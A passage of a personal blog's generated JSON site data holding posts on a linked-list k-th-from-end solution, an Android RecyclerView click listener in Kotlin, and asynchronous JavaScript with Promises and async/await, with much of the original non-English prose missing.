k</a></h4><p>k11</p>\n<p> 6  123456 3  4 </p>\n<p></p>\n<blockquote>\n<p> : 1-&gt;2-&gt;3-&gt;4-&gt;5,  k = 2.</p>\n<p> 4-&gt;5.</p>\n</blockquote>\n</blockquote>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token comment\">/**\n * Definition for singly-linked list.\n * function ListNode(val) {\n *     this.val = val;\n *     this.next = null;\n * }\n */</span>\n<span class=\"token comment\">/**\n * @param {ListNode} head\n * @param {number} k\n * @return {ListNode}\n */</span>\n<span class=\"token keyword\">var</span> <span class=\"token function-variable function\">getKthFromEnd</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">head<span class=\"token punctuation\">,</span> k</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> <span class=\"token punctuation\">[</span>fast<span class=\"token punctuation\">,</span> slow<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>head<span class=\"token punctuation\">,</span> head<span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>fast <span class=\"token operator\">&amp;&amp;</span> k <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token punctuation\">[</span>fast<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>fast<span class=\"token punctuation\">.</span>next<span class=\"token punctuation\">,</span> k <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>fast<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token punctuation\">[</span>fast<span class=\"token punctuation\">,</span> slow<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>fast<span class=\"token punctuation\">.</span>next<span class=\"token punctuation\">,</span> slow<span class=\"token punctuation\">.</span>next<span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">return</span> slow\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>fastk+1fastslowfastslow</p>\n<p>lenfastk+1slowfastlen-(k+1)k</p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n<blockquote>\n<h4 id=\"-Offer-22-k\"><a href=\"#-Offer-22-k\" class=\"headerlink\" title=\" Offer 22. k\"></a><a href=\"https://leetcode.cn/problems/lian-biao-zhong-dao-shu-di-kge-jie-dian-lcof/\"> Offer 22. k</a></h4><p>k11</p>\n<p> 6  123456 3  4 </p>\n<p></p>\n<blockquote>\n<p> : 1-&gt;2-&gt;3-&gt;4-&gt;5,  k &#x3D; 2.</p>\n<p> 4-&gt;5.</p>\n</blockquote>\n</blockquote>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token comment\">/**\n * Definition for singly-linked list.\n * function ListNode(val) &#123;\n *     this.val = val;\n *     this.next = null;\n * &#125;\n */</span>\n<span class=\"token comment\">/**\n * @param &#123;ListNode&#125; head\n * @param &#123;number&#125; k\n * @return &#123;ListNode&#125;\n */</span>\n<span class=\"token keyword\">var</span> <span class=\"token function-variable function\">getKthFromEnd</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">head<span class=\"token punctuation\">,</span> k</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">let</span> <span class=\"token punctuation\">[</span>fast<span class=\"token punctuation\">,</span> slow<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>head<span class=\"token punctuation\">,</span> head<span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>fast <span class=\"token operator\">&amp;&amp;</span> k <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token punctuation\">[</span>fast<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>fast<span class=\"token punctuation\">.</span>next<span class=\"token punctuation\">,</span> k <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>fast<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token punctuation\">[</span>fast<span class=\"token punctuation\">,</span> slow<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>fast<span class=\"token punctuation\">.</span>next<span class=\"token punctuation\">,</span> slow<span class=\"token punctuation\">.</span>next<span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">return</span> slow\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>fastk+1fastslowfastslow</p>\n<p>lenfastk+1slowfastlen-(k+1)k</p>\n"},{"title":"Android","date":"2021-10-24T13:06:57.000Z","author":"","hide":false,"summary":"","_content":"\n# Android\n\n# RecyclerViewonItemClickonBindViewHolder\n\n****\n\n\n\n```kotlin\n   private var itemClickListener: (Int) -> Unit = { }\n\t\n   override fun onBindViewHolder(holder: ViewHolder, position: Int) {\n        val fruit = data[position]\n        holder.fruitImage.setImageResource(fruit.image)\n        holder.fruitName.text = fruit.name\n        holder.itemView.setOnClickListener {\n            itemClickListener(position)\n        }\n    }\n\n    /**\n     * \n     */\n    fun onItemClick(func: (Int) -> Unit) {\n        itemClickListener = func\n    }\n```\n\n****\n\nViewHolder\n\n```kotlin\n    private var itemClickListener: (Int) -> Unit = { }\n\n    inner class ViewHolder(view: View) : RecyclerView.ViewHolder(view) {\n\n        init {\n            view.setOnClickListener {\n                itemClickListener(bindingAdapterPosition)\n            }\n        }\n\n        val fruitImage: ImageView = view.fruitImage\n        val fruitName: TextView = view.fruitName\n    }\n    \n   /**\n     * \n     */\n    fun onItemClick(func: (Int) -> Unit) {\n        itemClickListener = func\n    }\n```","source":"_posts/android-note-1.md","raw":"---\ntitle: Android\ndate: 2021-10-24 21:06:57\nauthor: \nhide: false\nsummary: \ncategories: \ntags:\n  - Android\n---\n\n# Android\n\n# RecyclerViewonItemClickonBindViewHolder\n\n****\n\n\n\n```kotlin\n   private var itemClickListener: (Int) -> Unit = { }\n\t\n   override fun onBindViewHolder(holder: ViewHolder, position: Int) {\n        val fruit = data[position]\n        holder.fruitImage.setImageResource(fruit.image)\n        holder.fruitName.text = fruit.name\n        holder.itemView.setOnClickListener {\n            itemClickListener(position)\n        }\n    }\n\n    /**\n     * \n     */\n    fun onItemClick(func: (Int) -> Unit) {\n        itemClickListener = func\n    }\n```\n\n****\n\nViewHolder\n\n```kotlin\n    private var itemClickListener: (Int) -> Unit = { }\n\n    inner class ViewHolder(view: View) : RecyclerView.ViewHolder(view) {\n\n        init {\n            view.setOnClickListener {\n                itemClickListener(bindingAdapterPosition)\n            }\n        }\n\n        val fruitImage: ImageView = view.fruitImage\n        val fruitName: TextView = view.fruitName\n    }\n    \n   /**\n     * \n     */\n    fun onItemClick(func: (Int) -> Unit) {\n        itemClickListener = func\n    }\n```","slug":"android-note-1","published":1,"updated":"2021-11-13T16:16:43.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jt10007sfkl013k28dw","content":"<h1 id=\"Android\"><a href=\"#Android\" class=\"headerlink\" title=\"Android\"></a>Android</h1><h1 id=\"RecyclerViewonItemClickonBindViewHolder\"><a href=\"#RecyclerViewonItemClickonBindViewHolder\" class=\"headerlink\" title=\"RecyclerViewonItemClickonBindViewHolder\"></a>RecyclerViewonItemClickonBindViewHolder</h1><p><strong></strong></p>\n<p></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">private</span> <span class=\"token keyword\">var</span> itemClickListener<span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span>Int<span class=\"token punctuation\">)</span> <span class=\"token operator\">-&gt;</span> Unit <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> <span class=\"token punctuation\">}</span>\n\t\n<span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">onBindViewHolder</span><span class=\"token punctuation\">(</span>holder<span class=\"token operator\">:</span> ViewHolder<span class=\"token punctuation\">,</span> position<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n     <span class=\"token keyword\">val</span> fruit <span class=\"token operator\">=</span> <span class=\"token keyword\">data</span><span class=\"token punctuation\">[</span>position<span class=\"token punctuation\">]</span>\n     holder<span class=\"token punctuation\">.</span>fruitImage<span class=\"token punctuation\">.</span><span class=\"token function\">setImageResource</span><span class=\"token punctuation\">(</span>fruit<span class=\"token punctuation\">.</span>image<span class=\"token punctuation\">)</span>\n     holder<span class=\"token punctuation\">.</span>fruitName<span class=\"token punctuation\">.</span>text <span class=\"token operator\">=</span> fruit<span class=\"token punctuation\">.</span>name\n     holder<span class=\"token punctuation\">.</span>itemView<span class=\"token punctuation\">.</span><span class=\"token function\">setOnClickListener</span> <span class=\"token punctuation\">{</span>\n         <span class=\"token function\">itemClickListener</span><span class=\"token punctuation\">(</span>position<span class=\"token punctuation\">)</span>\n     <span class=\"token punctuation\">}</span>\n <span class=\"token punctuation\">}</span>\n\n <span class=\"token comment\">/**\n  * \n  */</span>\n <span class=\"token keyword\">fun</span> <span class=\"token function\">onItemClick</span><span class=\"token punctuation\">(</span>func<span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span>Int<span class=\"token punctuation\">)</span> <span class=\"token operator\">-&gt;</span> Unit<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n     itemClickListener <span class=\"token operator\">=</span> func\n <span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong></strong></p>\n<p>ViewHolder</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"> <span class=\"token keyword\">private</span> <span class=\"token keyword\">var</span> itemClickListener<span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span>Int<span class=\"token punctuation\">)</span> <span class=\"token operator\">-&gt;</span> Unit <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> <span class=\"token punctuation\">}</span>\n\n <span class=\"token keyword\">inner</span> <span class=\"token keyword\">class</span> <span class=\"token function\">ViewHolder</span><span class=\"token punctuation\">(</span>view<span class=\"token operator\">:</span> View<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> RecyclerView<span class=\"token punctuation\">.</span><span class=\"token function\">ViewHolder</span><span class=\"token punctuation\">(</span>view<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\n     <span class=\"token keyword\">init</span> <span class=\"token punctuation\">{</span>\n         view<span class=\"token punctuation\">.</span><span class=\"token function\">setOnClickListener</span> <span class=\"token punctuation\">{</span>\n             <span class=\"token function\">itemClickListener</span><span class=\"token punctuation\">(</span>bindingAdapterPosition<span class=\"token punctuation\">)</span>\n         <span class=\"token punctuation\">}</span>\n     <span class=\"token punctuation\">}</span>\n\n     <span class=\"token keyword\">val</span> fruitImage<span class=\"token operator\">:</span> ImageView <span class=\"token operator\">=</span> view<span class=\"token punctuation\">.</span>fruitImage\n     <span class=\"token keyword\">val</span> fruitName<span class=\"token operator\">:</span> TextView <span class=\"token operator\">=</span> view<span class=\"token punctuation\">.</span>fruitName\n <span class=\"token punctuation\">}</span>\n \n<span class=\"token comment\">/**\n  * \n  */</span>\n <span class=\"token keyword\">fun</span> <span class=\"token function\">onItemClick</span><span class=\"token punctuation\">(</span>func<span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span>Int<span class=\"token punctuation\">)</span> <span class=\"token operator\">-&gt;</span> Unit<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n     itemClickListener <span class=\"token operator\">=</span> func\n <span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<h1 id=\"Android\"><a href=\"#Android\" class=\"headerlink\" title=\"Android\"></a>Android</h1><h1 id=\"RecyclerViewonItemClickonBindViewHolder\"><a href=\"#RecyclerViewonItemClickonBindViewHolder\" class=\"headerlink\" title=\"RecyclerViewonItemClickonBindViewHolder\"></a>RecyclerViewonItemClickonBindViewHolder</h1><p><strong></strong></p>\n<p></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">private</span> <span class=\"token keyword\">var</span> itemClickListener<span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span>Int<span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> Unit <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token punctuation\">&#125;</span>\n\t\n<span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">onBindViewHolder</span><span class=\"token punctuation\">(</span>holder<span class=\"token operator\">:</span> ViewHolder<span class=\"token punctuation\">,</span> position<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n     <span class=\"token keyword\">val</span> fruit <span class=\"token operator\">=</span> <span class=\"token keyword\">data</span><span class=\"token punctuation\">[</span>position<span class=\"token punctuation\">]</span>\n     holder<span class=\"token punctuation\">.</span>fruitImage<span class=\"token punctuation\">.</span><span class=\"token function\">setImageResource</span><span class=\"token punctuation\">(</span>fruit<span class=\"token punctuation\">.</span>image<span class=\"token punctuation\">)</span>\n     holder<span class=\"token punctuation\">.</span>fruitName<span class=\"token punctuation\">.</span>text <span class=\"token operator\">=</span> fruit<span class=\"token punctuation\">.</span>name\n     holder<span class=\"token punctuation\">.</span>itemView<span class=\"token punctuation\">.</span><span class=\"token function\">setOnClickListener</span> <span class=\"token punctuation\">&#123;</span>\n         <span class=\"token function\">itemClickListener</span><span class=\"token punctuation\">(</span>position<span class=\"token punctuation\">)</span>\n     <span class=\"token punctuation\">&#125;</span>\n <span class=\"token punctuation\">&#125;</span>\n\n <span class=\"token comment\">/**\n  * \n  */</span>\n <span class=\"token keyword\">fun</span> <span class=\"token function\">onItemClick</span><span class=\"token punctuation\">(</span>func<span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span>Int<span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> Unit<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n     itemClickListener <span class=\"token operator\">=</span> func\n <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong></strong></p>\n<p>ViewHolder</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"> <span class=\"token keyword\">private</span> <span class=\"token keyword\">var</span> itemClickListener<span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span>Int<span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> Unit <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token punctuation\">&#125;</span>\n\n <span class=\"token keyword\">inner</span> <span class=\"token keyword\">class</span> <span class=\"token function\">ViewHolder</span><span class=\"token punctuation\">(</span>view<span class=\"token operator\">:</span> View<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> RecyclerView<span class=\"token punctuation\">.</span><span class=\"token function\">ViewHolder</span><span class=\"token punctuation\">(</span>view<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n     <span class=\"token keyword\">init</span> <span class=\"token punctuation\">&#123;</span>\n         view<span class=\"token punctuation\">.</span><span class=\"token function\">setOnClickListener</span> <span class=\"token punctuation\">&#123;</span>\n             <span class=\"token function\">itemClickListener</span><span class=\"token punctuation\">(</span>bindingAdapterPosition<span class=\"token punctuation\">)</span>\n         <span class=\"token punctuation\">&#125;</span>\n     <span class=\"token punctuation\">&#125;</span>\n\n     <span class=\"token keyword\">val</span> fruitImage<span class=\"token operator\">:</span> ImageView <span class=\"token operator\">=</span> view<span class=\"token punctuation\">.</span>fruitImage\n     <span class=\"token keyword\">val</span> fruitName<span class=\"token operator\">:</span> TextView <span class=\"token operator\">=</span> view<span class=\"token punctuation\">.</span>fruitName\n <span class=\"token punctuation\">&#125;</span>\n \n<span class=\"token comment\">/**\n  * \n  */</span>\n <span class=\"token keyword\">fun</span> <span class=\"token function\">onItemClick</span><span class=\"token punctuation\">(</span>func<span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span>Int<span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> Unit<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n     itemClickListener <span class=\"token operator\">=</span> func\n <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>"},{"title":"JavaScript","date":"2021-11-28T16:00:00.000Z","author":"","hide":false,"summary":"","_content":"\n# \n\n> bukkit\n\n## \n\n****************\n\n****\n\n\n\n\n\njavascript \n\n~~~javascript\nconsole.log(\"Hello\")\n// \nsetTimeout(() => {\n   // \n   console.log(\"Hello World\")\n}, 500)\nconsole.log(\"World\")\n~~~\n\n:\n\n~~~\nHello\nWorld\nHello World\n~~~\n\n## JavaScript\n\n> JavaScriptWeb Worker\n\n### \n\n****\n\n\n\n~~~javascript\nsetTimeout(function () {\n  console.log(\"\");\n  if(==true){\n  setTimeout(function(){\n       console.log(\")\n  },500)\n  else(==false){\n   setTimeout(function () {\n    console.log(\"\");\n    setTimeout(function () {\n      console.log(\"\");\n      setTimeout(function () {\n        ;\n      }, 3000);\n    }, 500);\n  }, 500);\n  }\n}, 500);\n~~~\n\n### Promise\n\n> Promise \n\nPromise \n\n#### then/catch \n\nJavaCompletableFuture\n\nCompletableFuture\n\n~~~javascript\nlet p = new Promise((resolve, reject) => {\n    //\n    setTimeout(() => {\n        console.log('');\n       if ==trueresolve(\"\");\n       else reject(\"\")\n    }, 2000);\n}).then((data)=>{\n     console.log(data)\n     return data\n     //dataresolve\n},(error)=>{\n     console.log(error)\n     //errorreject\n}).then((data)=>{\n   console.log(data)\n   return data \n   //\n}).then((data)=>{\n   console.log(data)\n   //\n}).then((data)=>{\n   console.log(data)\n   //undefined\n}).catch((error)=>{\n    console.log(data)\n})\n~~~\n\n#### all/race \n\n- all \n\n  >Promiseall\n\n  ~~~javascript\n  let Promise1 = new Promise(function(resolve, reject){})\n  let Promise2 = new Promise(function(resolve, reject){})\n  let Promise3 = new Promise(function(resolve, reject){})\n  \n  let p = Promise.all([Promise1, Promise2, Promise3])\n  \n  p.then(funciton(){\n    //   \n  }, function(){\n    //  \n  })\n  ~~~\n\n- race \n\n  ******\n\n  > racepromisepromise\n\n  ~~~javascript\n   //\n      function requestImg(){\n          var p = new Promise((resolve, reject) => {\n              var img = new Image();\n              img.onload = function(){\n                  resolve(img);\n              }\n              img.src = '';\n          });\n          return p;\n      }\n      //\n      function timeout(){\n          var p = new Promise((resolve, reject) => {\n              setTimeout(() => {\n                  reject('');\n              }, 5000);\n          });\n          return p;\n      }\n      Promise.race([requestImg(), timeout()]).then((data) =>{\n          console.log(data);\n      }).catch((err) => {\n          console.log(err);\n      });\n  ~~~\n\n### async/await\n\npromise\n\n> asyncasyncawait\n>\n> kotlinsuspend   Deffered#await\n>\n> js\n\n****\n\n~~~javascript\n// awaitpromiseasync\nconst step = (size, time, ele) => {\n    return new Promise((resolve, reject) => {\n        setTimeout(() => {\n            ele.style.marginLeft = `${size}px`\n            resolve(size)\n        }, time)\n    })\n}\n\n// awaitstep\nasync function asyncAnimation(id) {\n    const ele = document.getElementById(id)\n    for (let i = 1; i <= 200; i++) {\n        await step(i + 100, 10, ele)\n    }\n}\n\n// \n// \nasync function awaitAll() {\n    await asyncAnimation(\"one\")\n    await asyncAnimation(\"two\")\n    await asyncAnimation(\"three\")\n}\n\nawaitAll()\n~~~\n\n#### \n\n##### top await\n\n\n\n> type=\"module\" \n>\n> JSJS top await await  async \n>\n>  \n\n~~~html\n<script src=\"optimize/script.js\" type=\"module\" defer></script>\n~~~\n\nawait\n\ncode\n\n~~~javascript\nconst p = document.querySelector('p')\nconst content = `\n\n\n`\n\n// JavaThread.sleep\nasync function sleep(ms) {\n    return new Promise(resolve => {\n        setTimeout(() => resolve(), ms)\n    })\n}\n\nfor (let i = 0; i < content.length; i++) {\n    p.textContent = content.substring(0, i)\n    await sleep(200)\n}\n~~~\n\n\n\n##### css\n\n~~~css\n.circle {\n    width: 100px;\n    height: 100px;\n    border-radius: 100%;\n    transition: all 1s;\n}\n\n.circle.at-end {\n    transform: translateX(200px);\n}\n~~~\n\ntransition: all 1s; 1s\n","source":"_posts/async-javascript.md","raw":"---\ntitle: JavaScript\ndate: 2021-11-29\nauthor: \nhide: false\nsummary: \ncategories: \ntags:\n  - javascript\n  - \n---\n\n# \n\n> bukkit\n\n## \n\n****************\n\n****\n\n\n\n\n\njavascript \n\n~~~javascript\nconsole.log(\"Hello\")\n// \nsetTimeout(() => {\n   // \n   console.log(\"Hello World\")\n}, 500)\nconsole.log(\"World\")\n~~~\n\n:\n\n~~~\nHello\nWorld\nHello World\n~~~\n\n## JavaScript\n\n> JavaScriptWeb Worker\n\n### \n\n****\n\n\n\n~~~javascript\nsetTimeout(function () {\n  console.log(\"\");\n  if(==true){\n  setTimeout(function(){\n       console.log(\")\n  },500)\n  else(==false){\n   setTimeout(function () {\n    console.log(\"\");\n    setTimeout(function () {\n      console.log(\"\");\n      setTimeout(function () {\n        ;\n      }, 3000);\n    }, 500);\n  }, 500);\n  }\n}, 500);\n~~~\n\n### Promise\n\n> Promise \n\nPromise \n\n#### then/catch \n\nJavaCompletableFuture\n\nCompletableFuture\n\n~~~javascript\nlet p = new Promise((resolve, reject) => {\n    //\n    setTimeout(() => {\n        console.log('');\n       if ==trueresolve(\"\");\n       else reject(\"\")\n    }, 2000);\n}).then((data)=>{\n     console.log(data)\n     return data\n     //dataresolve\n},(error)=>{\n     console.log(error)\n     //errorreject\n}).then((data)=>{\n   console.log(data)\n   return data \n   //\n}).then((data)=>{\n   console.log(data)\n   //\n}).then((data)=>{\n   console.log(data)\n   //undefined\n}).catch((error)=>{\n    console.log(data)\n})\n~~~\n\n#### all/race \n\n- all \n\n  >Promiseall\n\n  ~~~javascript\n  let Promise1 = new Promise(function(resolve, reject){})\n  let Promise2 = new Promise(function(resolve, reject){})\n  let Promise3 = new Promise(function(resolve, reject){})\n  \n  let p = Promise.all([Promise1, Promise2, Promise3])\n  \n  p.then(funciton(){\n    //   \n  }, function(){\n    //  \n  })\n  ~~~\n\n- race \n\n  ******\n\n  > racepromisepromise\n\n  ~~~javascript\n   //\n      function requestImg(){\n          var p = new Promise((resolve, reject) => {\n              var img = new Image();\n              img.onload = function(){\n                  resolve(img);\n              }\n              img.src = '';\n          });\n          return p;\n      }\n      //\n      function timeout(){\n          var p = new Promise((resolve, reject) => {\n              setTimeout(() => {\n                  reject('');\n              }, 5000);\n          });\n          return p;\n      }\n      Promise.race([requestImg(), timeout()]).then((data) =>{\n          console.log(data);\n      }).catch((err) => {\n          console.log(err);\n      });\n  ~~~\n\n### async/await\n\npromise\n\n> asyncasyncawait\n>\n> kotlinsuspend   Deffered#await\n>\n> js\n\n****\n\n~~~javascript\n// awaitpromiseasync\nconst step = (size, time, ele) => {\n    return new Promise((resolve, reject) => {\n        setTimeout(() => {\n            ele.style.marginLeft = `${size}px`\n            resolve(size)\n        }, time)\n    })\n}\n\n// awaitstep\nasync function asyncAnimation(id) {\n    const ele = document.getElementById(id)\n    for (let i = 1; i <= 200; i++) {\n        await step(i + 100, 10, ele)\n    }\n}\n\n// \n// \nasync function awaitAll() {\n    await asyncAnimation(\"one\")\n    await asyncAnimation(\"two\")\n    await asyncAnimation(\"three\")\n}\n\nawaitAll()\n~~~\n\n#### \n\n##### top await\n\n\n\n> type=\"module\" \n>\n> JSJS top await await  async \n>\n>  \n\n~~~html\n<script src=\"optimize/script.js\" type=\"module\" defer></script>\n~~~\n\nawait\n\ncode\n\n~~~javascript\nconst p = document.querySelector('p')\nconst content = `\n\n\n`\n\n// JavaThread.sleep\nasync function sleep(ms) {\n    return new Promise(resolve => {\n        setTimeout(() => resolve(), ms)\n    })\n}\n\nfor (let i = 0; i < content.length; i++) {\n    p.textContent = content.substring(0, i)\n    await sleep(200)\n}\n~~~\n\n\n\n##### css\n\n~~~css\n.circle {\n    width: 100px;\n    height: 100px;\n    border-radius: 100%;\n    transition: all 1s;\n}\n\n.circle.at-end {\n    transform: translateX(200px);\n}\n~~~\n\ntransition: all 1s; 1s\n","slug":"async-javascript","published":1,"updated":"2022-11-24T03:04:31.938Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jt20009sfklau6n5ido","content":"<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><blockquote>\n<p>bukkit</p>\n</blockquote>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><strong></strong><strong></strong><strong></strong><strong></strong></p>\n<p><strong></strong></p>\n<p></p>\n<p></p>\n<p>javascript </p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">// </span>\n<span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n   <span class=\"token comment\">// </span>\n   console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello World\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token number\">500</span><span class=\"token punctuation\">)</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"World\"</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Hello\nWorld\nHello World<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"JavaScript\"><a href=\"#JavaScript\" class=\"headerlink\" title=\"JavaScript\"></a>JavaScript</h2><blockquote>\n<p>JavaScriptWeb Worker</p>\n</blockquote>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p><strong></strong></p>\n<p></p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span><span class=\"token 